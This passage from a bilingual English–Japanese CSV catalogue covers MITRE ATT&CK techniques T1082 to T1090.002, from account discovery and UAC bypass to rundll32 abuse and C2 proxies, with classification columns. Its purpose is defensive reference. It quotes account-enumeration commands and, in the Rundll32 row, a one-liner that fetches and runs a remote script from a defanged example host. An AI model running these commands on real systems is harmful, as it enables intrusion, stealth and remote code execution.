Resource)(引用元: Microsoft Virutal Machine API) [システム情報発見](https://attack.mitre.org/techniques/T1082) は、他の発見・偵察手法で収集した情報と組み合わせることで、ペイロード開発や隠蔽を促進できる。(引用元: OSX.FairyTale)(引用元: 20 macOS Common Tools and Techniques),discovery,Windows;IaaS;Linux;macOS;Network Devices;ESXi,script_command_execution,situational_awareness,authentication_system;privileged_account;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access,specified,Business Workstation;File Server;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1,2017-05-31T21:31:04.307Z,2025-04-15T19:58:21.308Z,,,,
T1083,,File and Directory Discovery,ファイルおよびディレクトリの発見,"Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. Many command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>.(Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).(Citation: US-CERT-TA18-106A) Some files and directories may require elevated or specific user permissions to access.",攻撃者は、ファイルやディレクトリを列挙したり、ホストやネットワーク共有の特定の場所でファイルシステム内の特定情報を検索したりすることがあります。攻撃者は、自動化された発見プロセスにおける[ファイルおよびディレクトリの発見](https://attack.mitre.org/techniques/T1083)から得た情報を基に、ターゲットへの完全な感染の可否や特定のアクションの試行を含む、その後の行動を決定することがあります。 この情報を取得するために使用できるコマンドシェルユーティリティは多数存在する。 例としては、<code>dir</code>、<code>tree</code>、<code>ls</code>、<code>find</code>、<code>locate</code> などがある（引用元：Windows Commands JPCERT）。カスタムツールを使用してファイルやディレクトリ情報を収集し、[ネイティブ API](https://attack.mitre.org/techniques/T1106) とやり取りすることも可能である。 攻撃者は、ネットワークデバイス上の [ネットワークデバイス CLI](https://attack.mitre.org/techniques/T1059/008) を活用してファイルやディレクトリ情報を収集することもあります（例：<code>dir</code>、<code>show flash</code>、<code>nvram</code>）。(引用元: US-CERT-TA18-106A) 一部のファイルやディレクトリには、アクセスするために昇格された、または特定のユーザー権限が必要な場合があります。,discovery,Linux;macOS;Windows;Network Devices;ESXi,script_command_execution,situational_awareness,privileged_account;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access,specified,Business Workstation;File Server;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18,2017-05-31T21:31:04.710Z,2025-04-15T19:58:44.118Z,,,,
T1084,,Windows Management Instrumentation Event Subscription,Windows Management Instrumentation イベントサブスクリプション,"Windows Management Instrumentation (WMI) can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. Adversaries may attempt to evade detection of this technique by compiling WMI scripts into Windows Management Object (MOF) files (.mof extension). (Citation: Dell WMI Persistence) Examples of events that may be subscribed to are the wall clock time or the computer's uptime. (Citation: Kazanciyan 2014) Several threat groups have reportedly used this technique to maintain persistence. (Citation: Mandiant M-Trends 2015)",Windows Management Instrumentation (WMI) を使用すると、定義されたイベント発生時にコードを実行するイベントフィルター、プロバイダー、コンシューマー、バインディングをインストールできます。攻撃者は WMI の機能を利用してイベントを購読し、そのイベント発生時に任意のコードを実行することで、システムへの永続性を確保する可能性があります。攻撃者は WMI スクリプトを Windows Management Object (MOF) ファイル（.mof 拡張子）にコンパイルすることで、この手法の検出回避を試みる場合があります。 (引用: Dell WMI Persistence) 購読可能なイベントの例としては、壁時計時刻やコンピュータの稼働時間などがある。(引用: Kazanciyan 2014) 複数の脅威グループがこの手法を用いて永続性を維持したと報告されている。(引用: Mandiant M-Trends 2015),persistence,Windows,script_command_execution,foothold,endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--e906ae4d-1d3a-4675-be23-22f7311c0da4,2017-05-31T21:31:05.140Z,2025-04-25T15:16:19.359Z,,,,
T1085,,Rundll32,Rundll32,"The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations. Rundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL) Rundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""</code> This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)","rundll32.exeプログラムは任意のバイナリを実行するために呼び出せます。攻撃者はこの機能を利用し、コード実行をプロキシすることでセキュリティツールの検知を回避できます。Windowsが通常動作でrundll32.exeを使用するため、ホワイトリストや誤検知によりrundll32.exeプロセスの実行を監視しないツールが存在するためです。 rundll32.exe は、文書化されていない shell32.dll 関数 <code>Control_RunDLL</code> および <code>Control_RunDLLAsUser</code> を通じてコントロールパネル項目ファイル (.cpl) を実行するために使用できます。.cpl ファイルをダブルクリックしても rundll32.exe が実行されます。（出典：Trend Micro CPL）rundll32 は JavaScript などのスクリプトの実行にも使用できます。 この動作は以下のような構文で実現可能です：<code>rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""</code> この動作はPoweliksなどのマルウェアで確認されています。 (引用元: This is Security Command Line Confusion)",defense-evasion;execution,Windows,script_command_execution,stealth,user_interaction;endpoint_execution;network_connectivity;file_storage_access;logging_monitoring,specified,Business Workstation;Proxy / Gateway;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0002,attack-pattern--62b8c999-dcc0-4755-bd69-09442d9359f5,2017-05-31T21:31:06.045Z,2025-04-25T15:15:37.076Z,,,,
T1086,,PowerShell,PowerShell,"PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer. PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk. Administrator permissions are required to use PowerShell to connect to remote systems. A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363), PowerSploit, (Citation: Powersploit) and PSAttack. (Citation: Github PSAttack) PowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell's underlying System.Management.Automation assembly exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015) (Citation: Microsoft PSfromCsharp APR 2014)",PowerShellは、Windowsオペレーティングシステムに組み込まれた強力な対話型コマンドラインインターフェイスおよびスクリプト環境です。(出典: TechNet PowerShell) 攻撃者はPowerShellを使用して、情報収集やコード実行を含む様々な操作を実行できます。例としては、実行可能ファイルを実行するStart-Processコマンドレットや、ローカルまたはリモートコンピュータ上でコマンドを実行するInvoke-Commandコマンドレットが挙げられます。 PowerShellはインターネットから実行可能ファイルをダウンロードして実行する手段としても利用可能であり、ディスクから直接実行することも、ディスクに保存せずにメモリ内で実行することもできます。リモートシステムへの接続には管理者権限が必要です。PowerShellベースの攻撃的テストツールとして、[Empire](https://attack.mitre.org/software/S0363)、PowerSploit、 (引用元: Powersploit)やPSAttackなどです。(引用元: Github PSAttack) PowerShellコマンド/スクリプトは、.NETフレームワークおよびWindows共通言語インターフェイス(CLI)を通じて公開されるPowerShell基盤のSystem.Management.Automationアセンブリへのインターフェースを介し、powershell.exeバイナリを直接呼び出さずに実行することも可能です。 (引用: Sixdub PowerPick 2016年1月)(引用: SilentBreak Offensive PS 2015年12月) (引用: Microsoft PSfromCsharp 2014年4月),execution,Windows,script_command_execution,foothold,privileged_account;endpoint_execution;network_connectivity,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--f4882e23-8aa7-4b12-b28a-b349c12ee9e0,2017-05-31T21:31:06.512Z,2025-04-25T15:16:22.903Z,,,,
T1087,,Account Discovery,アカウントの発見,"Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., [Valid Accounts](https://attack.mitre.org/techniques/T1078)). Adversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment. For examples, cloud environments typically provide easily accessible interfaces to obtain user lists.(Citation: AWS List Users)(Citation: Google Cloud - IAM Servie Accounts List API) On hosts, adversaries can use default [PowerShell](https://attack.mitre.org/techniques/T1059/001) and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system’s files.",攻撃者は、システム上または侵害された環境内で有効なアカウント、ユーザー名、またはメールアドレスの一覧を取得しようとする可能性があります。 この情報は、攻撃者がどのアカウントが存在するかを判断するのに役立ち、ブルートフォース攻撃、スピアフィッシング攻撃、アカウント乗っ取りなどの後続の行動に活用される可能性があります（例：[有効なアカウント](https://attack.mitre.org/techniques/T1078)）。 攻撃者は、既存ツールの悪用、組み込みコマンド、標的環境におけるアカウント名や役割・権限を漏洩させる可能性のある設定ミスなど、複数の手法を用いてアカウントを列挙する可能性があります。例えば、クラウド環境では通常、ユーザーリストを取得するための容易にアクセス可能なインターフェースが提供されています。(引用: AWS List Users)(引用: Google Cloud - IAM サービスアカウント一覧 API) ホスト上では、攻撃者はデフォルトの[PowerShell](https://attack.mitre.org/techniques/T1059/001)やその他のコマンドライン機能を利用してアカウントを特定できる。また、感染システムのファイルを検索することで、メールアドレスやアカウントに関する情報を抽出することも可能である。,discovery,Windows;SaaS;IaaS;Linux;macOS;Office Suite;Identity Provider;ESXi,script_command_execution,situational_awareness,authentication_system;user_interaction;endpoint_execution;email_infrastructure;cloud_control_plane;file_storage_access,specified,Business Workstation;Identity / SaaS (IdP/SSO);Mail / Collaboration;Management Console for GovCloud;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--72b74d71-8169-42aa-92e0-e7b04b9f5a08,2017-05-31T21:31:06.988Z,2025-04-15T19:58:41.600Z,,,,
T1087.001,T1087,Local Account,ローカルアカウント,"Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior. Commands such as <code>net user</code> and <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility and <code>id</code> and <code>groups</code> on macOS and Linux can list local users and groups.(Citation: Mandiant APT1)(Citation: id man page)(Citation: groups man page) On Linux, local users can also be enumerated through the use of the <code>/etc/passwd</code> file. On macOS, the <code>dscl . list /Users</code> command can be used to enumerate local accounts. On ESXi servers, the `esxcli system account list` command can list local user accounts.(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)",攻撃者はローカルシステムアカウントの一覧を取得しようとする可能性があります。 この情報は、攻撃者がシステム上に存在するローカルアカウントを特定し、その後の行動を支援するのに役立ちます。[Net](https://attack.mitre.org/software/S0039)ユーティリティの<code>net user</code>や<code>net localgroup</code>、macOSおよびLinuxの<code>id</code>や<code>groups</code>などのコマンドは、ローカルユーザーとグループを一覧表示できます。(引用元: Mandiant APT1)(引用元: id マニュアルページ)(引用元: groups マニュアルページ) Linuxでは、<code>/etc/passwd</code>ファイルの使用を通じてローカルユーザーを列挙することも可能です。macOSでは、<code>dscl . list /Users</code>コマンドを使用してローカルアカウントを列挙できます。 ESXiサーバーでは、`esxcli system account list`コマンドでローカルユーザーアカウントを一覧表示できます。(引用: Crowdstrike Hypervisor Jackpotting Pt 2 2021),discovery,Linux;macOS;Windows;ESXi,script_command_execution,situational_awareness,user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--25659dd6-ea12-45c4-97e6-381e3e4b593e,2020-02-21T21:07:55.393Z,2025-04-15T19:58:14.718Z,,,,
T1087.002,T1087,Domain Account,ドメインアカウント,"Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior such as targeting specific accounts which possess particular privileges. Commands such as <code>net user /domain</code> and <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups. [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets including <code>Get-ADUser</code> and <code>Get-ADGroupMember</code> may enumerate members of Active Directory groups.(Citation: CrowdStrike StellarParticle January 2022)",攻撃者はドメインアカウントの一覧取得を試みる可能性があります。この情報は、特定の権限を持つアカウントを標的とするなど、攻撃の継続行動を支援するために、存在するドメインアカウントを特定するのに役立ちます。 [Net](https://attack.mitre.org/software/S0039)ユーティリティの<code>net user /domain</code>や<code>net group /domain</code>、macOSの<code>dscacheutil -q group</code>、Linuxの<code>ldapsearch</code>などのコマンドでドメインユーザーとグループを一覧表示できます。 <code>Get-ADUser</code> や <code>Get-ADGroupMember</code> を含む [PowerShell](https://attack.mitre.org/techniques/T1059/001) コマンドレットは、Active Directory グループのメンバーを列挙する可能性があります。(引用元: CrowdStrike StellarParticle 2022年1月),discovery,Linux;macOS;Windows,credential_abuse,situational_awareness,authentication_system;user_interaction;endpoint_execution,specified,AD / Directory Server;Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--21875073-b0ee-49e3-9077-1e2a885359af,2020-02-21T21:08:26.480Z,2025-04-15T22:21:07.252Z,,,,
T1087.003,T1087,Email Account,電子メールアカウント,"Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).(Citation: Microsoft Exchange Address Lists) In on-premises Exchange and Exchange Online, the <code>Get-GlobalAddressList</code> PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.(Citation: Microsoft getglobaladdresslist)(Citation: Black Hills Attacking Exchange MailSniper, 2016) In Google Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization.(Citation: Google Workspace Global Access List)","攻撃者はメールアドレスとアカウントの一覧取得を試みる可能性があります。攻撃者はグローバルアドレスリスト（GAL）などのExchangeアドレスリストのダンプを試みる可能性があります。（出典: Microsoft Exchange Address Lists）オンプレミスExchangeおよびExchange Onlineでは、<code>Get-GlobalAddressList</code> PowerShellコマンドレットを使用して、認証済みセッション経由でドメインからメールアドレスとアカウントを取得できます。(引用元: Microsoft getglobaladdresslist)(引用元: Black Hills Attacking Exchange MailSniper, 2016) Google Workspaceでは、GALはGoogle Workspace Sync for Microsoft Outlook (GWSMO) サービスを通じてMicrosoft Outlookユーザーと共有されます。さらに、Google Workspaceディレクトリにより、組織内の他のユーザーのリストを取得することが可能です。(引用元: Google Workspace Global Access List)",discovery,Windows;Office Suite,credential_abuse,situational_awareness,authentication_system;user_interaction;endpoint_execution;email_infrastructure;saas_in_use;file_storage_access,specified,Business Workstation;File Server;Identity / SaaS (IdP/SSO);Mail / Collaboration;Management Console for GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--4bc31b94-045b-4752-8920-aebaebdb6470,2020-02-21T21:08:33.237Z,2025-04-15T22:25:10.775Z,,,,
T1087.004,T1087,Cloud Account,クラウドアカウント,"Adversaries may attempt to get a listing of cloud accounts. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. With authenticated access there are several tools that can be used to find accounts. The <code>Get-MsolRoleMember</code> PowerShell cmdlet can be used to obtain account names given a role or permissions group in Office 365.(Citation: Microsoft msolrolemember)(Citation: GitHub Raindance) The Azure CLI (AZ CLI) also provides an interface to obtain user accounts with authenticated access to a domain. The command <code>az ad user list</code> will list all users within a domain.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018) The AWS command <code>aws iam list-users</code> may be used to obtain a list of users in the current account while <code>aws iam list-roles</code> can obtain IAM roles that have a specified path prefix.(Citation: AWS List Roles)(Citation: AWS List Users) In GCP, <code>gcloud iam service-accounts list</code> and <code>gcloud projects get-iam-policy</code> may be used to obtain a listing of service accounts and users in a project.(Citation: Google Cloud - IAM Servie Accounts List API)","攻撃者はクラウドアカウントの一覧取得を試みる可能性があります。クラウドアカウントとは、組織がユーザー、リモートサポート、サービス、またはクラウドサービスプロバイダーやSaaSアプリケーション内のリソース管理のために作成・設定したアカウントを指します。認証済みアクセス環境では、アカウント発見に利用可能なツールが複数存在します。 <code>Get-MsolRoleMember</code> PowerShellコマンドレットは、Office 365内のロールまたは権限グループを指定してアカウント名を取得するために使用できます。(引用元: Microsoft msolrolemember)(引用元: GitHub Raindance) Azure CLI (AZ CLI)も、ドメインへの認証済みアクセス権を持つユーザーアカウントを取得するためのインターフェースを提供します。 コマンド<code>az ad user list</code>はドメイン内の全ユーザーを一覧表示します。(引用元: Microsoft AZ CLI)(引用元: Black Hills Red Teaming MS AD Azure, 2018) AWSコマンド<code>aws iam list-users</code>は現在のアカウント内のユーザー一覧を取得でき、<code>aws iam list-roles</code>は指定されたパスプレフィックスを持つIAMロールを取得できます。(引用元: AWS List Roles)(引用元: AWS List Users) GCPでは、<code>gcloud iam service-accounts list</code>および<code>gcloud projects get-iam-policy</code>を使用して、プロジェクト内のサービスアカウントとユーザーのリストを取得できます。(引用元: Google Cloud - IAM サービスアカウント一覧 API)",discovery,SaaS;IaaS;Office Suite;Identity Provider,script_command_execution,situational_awareness,user_interaction;endpoint_execution;network_connectivity;email_infrastructure;cloud_control_plane;saas_in_use,specified,Identity / SaaS (IdP/SSO);Mail / Collaboration;Management Console for GovCloud,subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--8f104855-e5b7-4077-b1f5-bc3103b41abe,2020-02-21T21:08:36.570Z,2025-04-15T22:00:56.981Z,,,,
T1088,,Bypass User Account Control,ユーザー アカウント制御のバイパス,"Windows User Account Control (UAC) allows a program to elevate its privileges to perform a task under administrator-level permissions by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. (Citation: TechNet How UAC Works) If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs are allowed to elevate privileges or execute some elevated COM objects without prompting the user through the UAC notification box. (Citation: TechNet Inside UAC) (Citation: MSDN COM Elevation) An example of this is use of rundll32.exe to load a specifically crafted DLL which loads an auto-elevated COM object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user. (Citation: Davidson Windows) Adversaries can use these techniques to elevate privileges to administrator if the target process is unprotected. Many methods have been discovered to bypass UAC. The Github readme page for UACMe contains an extensive list of methods (Citation: Github UACMe) that have been discovered and implemented within UACMe, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as: * <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script. (Citation: enigma0x3 Fileless UAC Bypass) (Citation: Fortinet Fareit) Another bypass is possible through some Lateral Movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on lateral systems and default to high integrity. (Citation: SANS UAC Bypass)",Windowsのユーザーアカウント制御（UAC）は、ユーザーに確認を促すことで、プログラムが管理者レベルの権限でタスクを実行するために特権を昇格させることを許可します。ユーザーへの影響は、高レベルの強制下では操作を拒否することから、ローカル管理者グループに属するユーザーがプロンプトをクリックして操作を許可する場合、または管理者パスワードを入力して操作を完了させる場合まで様々です。 (引用元: TechNet UACの仕組み) コンピュータのUAC保護レベルが最高レベル以外の場合、特定のWindowsプログラムは、UAC通知ボックスによるユーザーへの確認なしに、特権の昇格や一部の昇格済みCOMオブジェクトの実行が許可されます。(引用元: TechNet UACの内部) (引用元: MSDN COMの昇格) その一例として、rundll32.exeを使用して特別に作成されたDLLをロードし、自動昇格されたCOMオブジェクトを起動して、通常は昇格されたアクセス権限を必要とする保護されたディレクトリ内でファイル操作を実行することが挙げられます。また、悪意のあるソフトウェアは、ユーザーにプロンプトを表示せずに昇格された権限を取得するために、信頼されたプロセスに注入される可能性があります。(引用元: Davidson Windows) 標的となるプロセスが保護されていない場合、攻撃者はこれらの手法を使用して管理者権限まで昇格させることができます。 UACをバイパスする多くの手法が発見されている。UACMeのGitHub READMEページには、UACMe内で発見・実装された手法の広範なリスト（引用元: GitHub UACMe）が掲載されているが、これはバイパス手法の網羅的なリストではない可能性がある。追加のバイパス手法は定期的に発見され、実環境で使用されるものもある。例：* <code>eventvwr.exe</code> は自動昇格が可能で、指定されたバイナリやスクリプトを実行できる。 (引用元: enigma0x3 Fileless UAC Bypass)(引用元: Fortinet Fareit) UACは単一システム向けのセキュリティ機構であるため、管理者権限を持つアカウントの認証情報が判明している場合、横方向移動（ラテラルムーブメント）技術による別の回避が可能である。これは、あるシステム上で実行中のプロセスの権限や完全性が、隣接システムでは不明となり、デフォルトで高完全性として扱われるためである。(引用元: SANS UAC Bypass),defense-evasion;privilege-escalation,Windows,credential_abuse,privilege_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0004,attack-pattern--ca1a3f50-5ebd-41f8-8320-2c7d6a6e88be,2017-05-31T21:31:07.462Z,2025-04-25T15:16:09.162Z,,,,
T1089,,Disabling Security Tools,セキュリティツールの無効化,"Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security scanning or event reporting.",攻撃者は、自身のツールや活動の検知を回避するため、セキュリティツールを無効化することがある。具体的には、セキュリティソフトウェアやイベント記録プロセスの強制終了、ツールの実行時起動を妨げるレジストリキーの削除、セキュリティスキャンやイベント報告を妨害するその他の手法が挙げられる。,defense-evasion,Linux;macOS;Windows,config_policy_manipulation,stealth,endpoint_execution;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--2e0dd10b-676d-4964-acd0-8a404c92b044,2017-05-31T21:31:07.958Z,2025-04-25T15:15:19.601Z,,,,
T1090,,Proxy,プロキシ,"Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic. Adversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.",攻撃者は、システム間のネットワークトラフィックを誘導したり、コマンドアンドコントロールサーバーへの通信の中継役として機能したりするために接続プロキシを使用し、自身のインフラへの直接接続を回避することがあります。プロキシ経由のトラフィックリダイレクトやポートリダイレクトを可能にするツールは多数存在し、[HTRAN](https://attack.mitre.org/software/S0040)、ZXProxy、ZXPortMapなどが含まれます。 （引用元：トレンドマイクロ APT 攻撃ツール）攻撃者は、コマンド＆コントロール通信の管理、同時アウトバウンドネットワーク接続数の削減、接続切断時の回復力確保、あるいは被害者間の既存の信頼された通信経路を悪用して疑いを回避するために、この種のプロキシを使用します。 攻撃者は複数のプロキシを連鎖させて悪意のあるトラフィックの送信元をさらに偽装する可能性があります。また、コンテンツ配信ネットワーク（CDN）のルーティング方式を悪用してC&Cトラフィックをプロキシすることも可能です。,command-and-control,Linux;macOS;Windows;Network Devices;ESXi,script_command_execution,remote_control,endpoint_execution;network_connectivity,specified,Business Workstation;Network Device (FW/Proxy/AP);Proxy / Gateway;Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--731f4f55-b6d0-41d1-a7a9-072a66389aea,2017-05-31T21:31:08.479Z,2025-04-25T15:15:44.084Z,,,,
T1090.001,T1090,Internal Proxy,内部プロキシ,"Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment. By using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.",攻撃者は、侵害された環境内の2つ以上のシステム間でC&Cトラフィックを転送するために内部プロキシを使用することがあります。[HTRAN](https://attack.mitre.org/software/S0040)、ZXProxy、ZXPortMapなど、プロキシ経由のトラフィック転送やポート転送を可能にするツールが多数存在します。 （出典：Trend Micro APT Attack Tools）攻撃者は、侵害された環境内でコマンド＆コントロール通信を管理するため、同時接続数を削減するため、接続切断時の耐障害性を確保するため、あるいは感染システム間の既存の信頼された通信経路を悪用して疑いを回避するために内部プロキシを利用します。 内部プロキシ接続は、SMBなどの一般的なピアツーピア（p2p）ネットワークプロトコルを使用することで、環境に溶け込みやすくなります。侵害された内部システムをプロキシとして使用することで、攻撃者はC2トラフィックの真の宛先を隠蔽すると同時に、外部システムへの多数の接続の必要性を低減できます。,command-and-control,Linux;Network Devices;Windows;macOS;ESXi,remote_service_abuse,remote_control,endpoint_execution;network_connectivity,specified,Business Workstation;File Server;Network Device (FW/Proxy/AP);Proxy / Gateway;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--f6dacc85-b37d-458e-b58d-74fc4bbf5755,2020-03-14T23:08:20.244Z,2025-04-15T19:59:22.365Z,,,,
T1090.002,T1090,External Proxy,外部プロキシ,"Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion. External connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.",攻撃者は、コマンドアンドコントロールサーバーへのネットワーク通信の中継役として外部プロキシを利用し、自身のインフラへの直接接続を回避することがあります。[HTRAN](https://attack.mitre.org/software/S0040)、ZXProxy、ZXPortMapなど、プロキシ経由のトラフィックリダイレクトやポートリダイレクトを可能にするツールが多数存在します。 （出典：Trend Micro APT Attack Tools）攻撃者は、C2通信の管理、接続切断時の耐障害性確保、既存の信頼済み通信経路を利用した検知回避のために、この種のプロキシを利用します。外部接続プロキシはC2トラフィックの宛先を隠蔽するために使用され、通常はポートリダイレクタで実装されます。 被害者環境外の侵害済みシステムがこれらの目的に利用されるほか、クラウドベースのリソースや仮想プライベートサーバーなどの購入済みインフラも使用される。侵害済みシステムからの接続が調査される可能性が低いことを理由にプロキシが選択される場合がある。被害者システムはインターネット上の外部プロキシと直接通信し、プロキシが通信をC2サーバーに転送する。,command-and-control,Linux;macOS;Windows;Network Devices;ESXi,script_command_execution,remote_control,endpoint_execution;network_connectivity;cloud_control_plane,specified,Business Workstation;Network Device (FW/Proxy/AP);Proxy / Gateway;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--69b8fd78-40e8-4600-ae4d-662c9d7afdb3,2020-03-14T23:12:18.466Z,2025-04-15T19:58:38.556Z,,,,
